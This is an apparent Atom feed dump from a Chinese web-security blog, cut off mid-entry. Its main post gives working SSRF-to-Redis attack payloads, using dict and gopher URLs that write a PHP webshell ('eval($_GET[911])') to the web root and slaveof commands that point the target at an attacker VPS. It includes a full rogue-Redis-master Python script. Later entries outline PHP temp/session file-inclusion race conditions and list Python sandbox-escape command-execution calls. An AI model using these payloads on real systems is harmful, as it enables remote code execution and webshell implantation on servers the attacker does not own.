    <content type="html"><![CDATA[<p>用dict协议通过SSRF间接打Redis的时候，数据中存在<code>:</code>、<code>&#39;</code>等特殊字符会导致set失败，可以通过位运算、gopher协议、主从同步数据、主从同步文件等方式躲开坏字符的坑。</p><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>对存在特殊字符的数据进行位运算，再在目标Redis上通过位运算将数据还原回来。<a href="https://redis.io/commands/bitop">举个栗子</a>：</p><p><img src="/img/ssrfdredisgbhzf_a.png"></p><ol start="0"><li>利用抑或的特性先set两个不会与dict协议冲突的字符串</li></ol><p><code>dict://127.0.0.1:6379/set:c:&quot;|\x7f&#125;%6!,hd\x1f\a\x05\x14\x1byqq\x1di&#123;\x7f~&quot;</code></p><p><code>dict://127.0.0.1:6379/set:b:&#39;@@@@@@@@@@@@@@@@@@@@@@&#39;</code></p><ol><li>再在目标上还原</li></ol><p><code>dict://127.0.0.1:6379/bitop:xor:a:b:c</code></p><ol start="2"><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="3"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="4"><li>持久化保存</li></ol><p><code>dict://127.0.0.1:6379/bgsave</code></p><p><img src="/img/ssrfdredisgbhzf_b.png"></p><h2 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h2><p>对redis-cli的命令数据抓包，利用gopher协议封装后重放给目标Redis。由于Redis的授权认证只有简单的一串<code>*2%0A%244%0Aauth%0A%248%0Afoobared</code>，且可以通过管道操作一次同时传输多条命令，因此这个方法还可以用来打知道密码的内网Redis。</p><ol start="0"><li>监听环回口6379端口并抓包</li></ol><p><code>sudo tcpdump port 6379 -i lo -w redis.pcap</code></p><p><img src="/img/ssrfdredisgbhzf_c.png"></p><ol><li>用gopher协议编码封装</li></ol><p><code>gopher://127.0.0.1:6379/_%244%0d%0aauth%0d%0a%248%0d%0afoobared%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0aa%0d%0a%2422%0d%0a%3C%3F%3Deval(%24_GET%5B911%5D)%3B%3F%3E%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2414%0d%0a%2Fvar%2Fwww%2Fhtml%2F%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%247%0d%0atmp.php%0d%0a*1%0d%0a%246%0d%0abgsave</code></p><ol start="2"><li>对数据体URL编码后发给目标</li></ol><p><code>?url=gopher://127.0.0.1:6379/_%25244%250d%250aauth%250d%250a%25248%250d%250afoobared%250d%250a*3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250aa%250d%250a%252422%250d%250a%253C%253F%253Deval(%2524_GET%255B911%255D)%253B%253F%253E%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250adir%250d%250a%252414%250d%250a%252Fvar%252Fwww%252Fhtml%252F%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%252410%250d%250adbfilename%250d%250a%25247%250d%250atmp.php%250d%250a*1%250d%250a%25246%250d%250abgsave</code></p><p>如果嫌麻烦也可以用<a href="https://github.com/tarunkant/Gopherus">gopherus</a>交互式生成payload，同样需要二次编码后再打，<code>auth</code>开头的验证信息也要手动加一下</p><h2 id="主从同步数据"><a href="#主从同步数据" class="headerlink" title="主从同步数据"></a>主从同步数据</h2><p>将数据通过redis-cli写入VPS的Redis，让目标通过主从同步加载数据。</p><ol start="0"><li><p>在VPS上通过redis-cli写入数据</p></li><li><p>在目标上设置主从同步</p></li></ol><p><code>dict://127.0.0.1:6379/slaveof:1.1.1.1:6379</code></p><ol start="2"><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="3"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="4"><li>持久化保存</li></ol><p><code>dict://127.0.0.1:6379/bgsave</code></p><ol start="5"><li>断开主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p><h2 id="主从同步文件"><a href="#主从同步文件" class="headerlink" title="主从同步文件"></a>主从同步文件</h2><p>r35tart师傅将Redis主从同步RCE的脚本 <a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 改了一下实现了无杂质写文件，这是一个主动连目标Redis打的脚本。</p><p>脚本耦合度不高只要把一些主动打的功能删掉就可以了，然后利用SSRF手动发包即可。</p><ol start="0"><li>准备要无损写的文件，在VPS上执行脚本</li></ol><p><code>python3 ssrf-redis-writefile.py --lhost=1.1.1.1 --lport=6379 --lfile=test.txt</code></p><ol><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="2"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="3"><li>在目标上设置主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:1.1.1.1:6379</code></p><ol start="4"><li>断开主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p><p>如果要用过认证或者是希望一把梭打完，就抓下包封装下gopher协议，道理是一样的。</p><blockquote><p>但是在Redis中，为了防止http协议对Redis端口的攻击，它如果检测到”POST”或者”Host:”，就会中断这次连接，并且在日志中留下这行，我们可以通过添加%00绕过<br>但是Redis是一边判断一边逐行执行，所以只要在读到”Host:”之前把需要的操作做完即可，所以不加也没关系</p></blockquote><ul><li>附脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">CLRF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author: hosch3n</span></span><br><span class="line"><span class="string">Reference: https://github.com/r35tart/RedisWriteFile/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;*&quot;</span>):</span><br><span class="line">        raw_arr = cmd.strip().split(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> raw_arr[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;$&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> cmd.split(<span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> cmd.strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">msg</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[1;32;40m[info]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">din</span>(<span class="params">sock, cnt=<span class="number">4096</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> verbose</span><br><span class="line">    msg = sock.recv(cnt)</span><br><span class="line">    <span class="keyword">if</span> verbose:</span><br><span class="line">        <span class="keyword">if</span> len(msg) &lt; <span class="number">1000</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;34;40m[-&gt;]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;34;40m[-&gt;]\033[0m &#123;&#125;......&#123;&#125;&quot;</span>.format(msg[:<span class="number">80</span>], msg[<span class="number">-80</span>:]))</span><br><span class="line">    <span class="keyword">return</span> msg.decode(<span class="string">&#x27;gb18030&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dout</span>(<span class="params">sock, msg</span>):</span></span><br><span class="line">    <span class="keyword">global</span> verbose</span><br><span class="line">    <span class="keyword">if</span> type(msg) != bytes:</span><br><span class="line">        msg = msg.encode()</span><br><span class="line">    sock.send(msg)</span><br><span class="line">    <span class="keyword">if</span> verbose:</span><br><span class="line">        <span class="keyword">if</span> len(msg) &lt; <span class="number">1000</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;33;40m[&lt;-]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;33;40m[&lt;-]\033[0m &#123;&#125;......&#123;&#125;&quot;</span>.format(msg[:<span class="number">80</span>], msg[<span class="number">-80</span>:]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RogueServer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lhost, lport</span>):</span></span><br><span class="line">        self._host = lhost</span><br><span class="line">        self._port = lport</span><br><span class="line">        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self._sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, self._port))</span><br><span class="line">        self._sock.listen(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        cmd_arr = decode_cmd(data)</span><br><span class="line">        resp = <span class="string">&quot;&quot;</span></span><br><span class="line">        phase = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PING&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+PONG&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;REPLCONF&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+OK&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PSYNC&quot;</span>) <span class="keyword">or</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;SYNC&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+FULLRESYNC &quot;</span> + <span class="string">&quot;Z&quot;</span>*<span class="number">40</span> + <span class="string">&quot; 1&quot;</span> + CLRF</span><br><span class="line">            resp += <span class="string">&quot;$&quot;</span> + str(len(payload)) + CLRF</span><br><span class="line">            resp = resp.encode()</span><br><span class="line">            resp += payload + CLRF.encode()</span><br><span class="line">            phase = <span class="number">3</span></span><br><span class="line">        <span class="keyword">return</span> resp, phase</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">self</span>):</span></span><br><span class="line">        cli, addr = self._sock.accept()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = din(cli, <span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            resp, phase = self.handle(data)</span><br><span class="line">            dout(cli, resp)</span><br><span class="line">            <span class="keyword">if</span> phase == <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runserver</span>(<span class="params">lhost, lport</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rogue = RogueServer(lhost, lport)</span><br><span class="line">        rogue.exp()</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">        rogue.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;\033[1;31;m[-]\033[0m 发生错误！ : &#123;&#125; \n[*] Exit..&quot;</span>.format(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lhost&quot;</span>, dest=<span class="string">&quot;lh&quot;</span>, type=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;rogue server ip&quot;</span>, metavar=<span class="string">&quot;LOCAL_HOST&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lport&quot;</span>, dest=<span class="string">&quot;lp&quot;</span>, type=<span class="string">&quot;int&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;rogue server listen port, default 6379&quot;</span>, default=<span class="number">6379</span>,</span><br><span class="line">            metavar=<span class="string">&quot;LOCAL_PORT&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lfile&quot;</span>, dest=<span class="string">&quot;lfile&quot;</span>, type=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;Local file that needs to be written&quot;</span>, metavar=<span class="string">&quot;Local_File_Name&quot;</span>, default=<span class="string">&#x27;dump.rdb&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--verbose&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, default=<span class="literal">False</span>,</span><br><span class="line">            help=<span class="string">&quot;Show full data stream&quot;</span>)</span><br><span class="line"></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">global</span> verbose, payload, filename</span><br><span class="line">    localfile = options.lfile</span><br><span class="line">    verbose = options.verbose</span><br><span class="line">    payload = open(localfile, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        runserver(options.lh, options.lp)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        info(repr(e))</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA">一次“SSRF–&gt;RCE”的艰难利用</a></p><p><a href="https://www.anquanke.com/post/id/181599#h2-2">浅析SSRF认证攻击Redis</a></p><p><a href="http://r3start.net/index.php/2020/05/09/683">通过 SSRF 操作 Redis 主从复制写 Webshell</a></p><p><a href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></p><p><a href="https://tyaoo.github.io/2020/08/31/2020-GACTF-web/">2020 GACTF web</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;用dict协议通过SSRF间接打Redis的时候，数据中存在&lt;code&gt;:&lt;/code&gt;、&lt;code&gt;&amp;#39;&lt;/code&gt;等特殊字符会导致set失败，可以通过位运算、gopher协议、主从同步数据、主从同步文件等方式躲开坏字符的坑。&lt;/p&gt;
&lt;h2 id=&quot;位运算&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="redis" scheme="https://hosch3n.github.io/tags/redis/"/>
    
    <category term="bitop" scheme="https://hosch3n.github.io/tags/bitop/"/>
    
    <category term="slaveof" scheme="https://hosch3n.github.io/tags/slaveof/"/>
    
  </entry>
  
  <entry>
    <title>PHP包含临时文件</title>
    <link href="https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/"/>
    <id>https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</id>
    <published>2020-09-04T09:54:48.000Z</published>
    <updated>2021-03-01T09:43:43.705Z</updated>
    
    <content type="html"><![CDATA[<p>即使PHP后端不是处理文件上传的代码，在收到上传文件数据时同样会创建缓存文件，文件名可以在<code>$_FILES</code>变量中找到（通常为<code>/tmp/php[六个随机字符]</code>），通过phpinfo页面可以读到<code>$_FILES</code>。</p><p>一般的请求等获取到phpinfo中的文件名时已经结束了，此时可控的临时文件就已经被删掉了，但由于phpinfo中<code>$_FILES[file][tmp_name]</code>比其它HTTP头先输出，因此可以在HTTP头中发送大量无用数据，读到临时文件名后立即利用文件包含执行代码，通过条件竞争抢到临时文件被删除前时间窗口。</p><p><img src="/img/phpbhlswj_a.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;即使PHP后端不是处理文件上传的代码，在收到上传文件数据时同样会创建缓存文件，文件名可以在&lt;code&gt;$_FILES&lt;/code&gt;变量中找到（通常为&lt;code&gt;/tmp/php[六个随机字符]&lt;/code&gt;），通过phpinfo页面可以读到&lt;code&gt;$_FILES&lt;/co</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="lfi" scheme="https://hosch3n.github.io/tags/lfi/"/>
    
    <category term="tmp" scheme="https://hosch3n.github.io/tags/tmp/"/>
    
  </entry>
  
  <entry>
    <title>PHP包含Session文件</title>
    <link href="https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%ABSession%E6%96%87%E4%BB%B6/"/>
    <id>https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%ABSession%E6%96%87%E4%BB%B6/</id>
    <published>2020-09-04T06:35:12.000Z</published>
    <updated>2021-03-01T09:44:00.108Z</updated>
    
    <content type="html"><![CDATA[<p>PHP的<code>session.save_path</code>配置指定了session文件的结构深度、文件权限、存放路径，格式为<code>N;MODE;/path</code>。<code>N</code>表示子文件夹划分深度，<code>MODE</code>表示文件的umask值（默认为600），<code>path</code>通常为<code>/var/lib/php/sessions</code>或<code>/tmp</code>。</p><p>PHP在大文件流式上传时，为了将上传进度存放在session中，如果不存在session则会自动初始化，直到文件上传结束后销毁（由<code>session.upload_progress.cleanup</code>指定）。当<code>session.upload_progress.enabled</code>为默认值1时，上传文件的同时传递<code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code>即可利用（由<code>session.upload_progress.name</code>指定）</p><p><code>session.name</code>通常为<code>PHPSESSID</code>，用作Cookie的键名。当<code>session.use_strict_mode</code>为默认值0时，客户端可以自定义sessionID，即通过Cookie传递<code>PHPSESSID=hosch3n</code>后，服务器将创建对应的<code>sess_hosch3n</code>文件。</p><p>因此就可以在利用文件上传自动初始化session的同时自定义sessionID，并利用条件竞争在文件上传完成前通过文件包含实现代码执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP的&lt;code&gt;session.save_path&lt;/code&gt;配置指定了session文件的结构深度、文件权限、存放路径，格式为&lt;code&gt;N;MODE;/path&lt;/code&gt;。&lt;code&gt;N&lt;/code&gt;表示子文件夹划分深度，&lt;code&gt;MODE&lt;/code&gt;表示</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="lfi" scheme="https://hosch3n.github.io/tags/lfi/"/>
    
    <category term="session" scheme="https://hosch3n.github.io/tags/session/"/>
    
  </entry>
  
  <entry>
    <title>Python沙箱逃逸</title>
    <link href="https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2020-08-27T13:02:57.000Z</published>
    <updated>2021-03-01T09:43:34.999Z</updated>
    
    <content type="html"><![CDATA[<p>Python沙箱逃逸指的是：突破原本受限的Python交互环境，实现执行命令、读写文件等操作。</p><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><p>Python导入模块时，会先判断<code>sys.modules</code>是否已经加载了该模块，如果没有加载则从<code>sys.path</code>中的目录按照模块名查找<code>py</code>、<code>pyc</code>、<code>pyd</code>文件，找到后执行该文件载入内存并添加至<code>sys.modules</code>中，再将模块名称导入Local命名空间。如果<code>a.py</code>中存在<code>import b</code>，则在<code>import a</code>时<code>ab</code>两个模块都会添加至<code>sys.modules</code>中，但仅将<code>a</code>导入Local命名空间。通过<code>from x import y</code>时，则将<code>x</code>添加至<code>sys.modules</code>中，将<code>y</code>导入Local命名空间。</p><p>因此除了常用方式，还可以通过手动添加、直接执行等方式导入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xxx <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;xxx&#x27;</span>]=<span class="string">&#x27;blacklist&#x27;</span></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;xxx&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line">a = open(<span class="string">&#x27;/usr/lib/python3.8/xxx.py&#x27;</span>).read()</span><br><span class="line">exec(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/xxx.py&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="危险方法"><a href="#危险方法" class="headerlink" title="危险方法"></a>危险方法</h3><p>有很多模块和方法可以用于执行命令或者读取文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">os.popen2(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">os.popen3(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">platform.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">commands.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, number=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">bdb.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cgi.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">importlib.__import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pickle.loads(<span class="string">b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;</span>)</span><br><span class="line"></span><br><span class="line">eval(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">exec(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">exec(compile(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line"></span><br><span 